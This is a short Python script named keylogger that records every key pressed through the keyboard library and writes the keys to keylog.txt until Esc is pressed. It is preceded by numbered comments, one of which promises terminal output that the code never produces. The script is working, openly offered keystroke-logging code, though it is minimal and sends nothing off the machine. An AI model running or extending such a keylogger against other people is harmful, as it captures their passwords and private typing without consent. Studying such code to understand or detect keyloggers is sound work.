#1. Make a .txt file
#2. Take an input (Key pressed) into a variable. 
#3. Print it on terminal
#4. Update the .txt file with the keys variable

import os 
import keyboard

def keylogger():
    f= open("keylog.txt","w+")
    count=0

    while True:
        a=keyboard.read_key()
        if count%2==0 and a != "esc":
            f.write(a+"\n")
        count+=1
        if a=="esc":
            break
    
    f.close()

keylogger()
